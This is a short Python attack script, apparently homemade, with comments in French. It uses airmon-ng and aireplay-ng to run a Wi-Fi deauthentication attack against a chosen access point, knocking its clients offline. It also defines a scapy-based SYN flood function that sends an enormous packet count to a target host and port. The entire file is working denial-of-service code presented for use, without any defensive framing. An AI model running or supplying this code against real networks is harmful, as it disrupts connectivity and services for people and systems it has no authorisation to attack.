#!/usr/bin/python

import socket
from scapy.all import *
import subprocess
import utile
import os
import time

timout = time.time() +10
channel = utile.channel()
BSSID = utile.getAPMac()

subprocess.call('clear', shell=True)
subprocess.call('airmon-ng ckeck kill',shell=True)

subprocess.call('airmon-ng',shell=True)

networkCard = str(utile.iwconfig())

subprocess.call('airmon-ng start {} {}'.format(networkCard,channel), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCardMon = '{}mon'.format(networkCard)

while True:
    os.system("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCardMon))
    if time.time() > timout:
        break

#Arreter le mode monitor et redemarrer la carte wifi
subprocess.call("airmon-ng stop {}".format(networkCardMon),shell=True)
subprocess.call("ifconfig {} up".format(networkCard),shell=True)
subprocess.call("service NetworkManager start",shell=True)
subprocess.call('clear',shell=True)

def dos_attack(host, port):
    try:
        ss = socket.create_connection((host, port), 3)
        time.sleep(2)
    except:
        exit ()
    
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.connect((host, port))
    time.sleep(2)
    send(IP(dst=host) /TCP(dport=port , seq=12345,ack=1000,window=1000, flags='S')/"hacked", count=10000000000)
